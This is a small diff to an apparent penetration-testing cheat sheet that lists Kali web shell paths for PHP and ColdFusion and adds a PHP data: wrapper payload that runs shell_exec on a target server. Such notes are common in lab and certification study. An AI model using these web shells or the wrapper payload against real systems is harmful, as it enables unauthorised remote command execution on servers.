@@ -33,6 +33,10 @@ PHP
 PHP 
 /usr/share/webshells/php/simple-backdoor.php , paramter - cmd 
 
+or PHP Wrappers
+data:text/plain,<?php echo shell_exec('ipconfig')?>
+
+
 Cold FUsion 
 /usr/share/webshells/cfm/cfexec.cfm
 
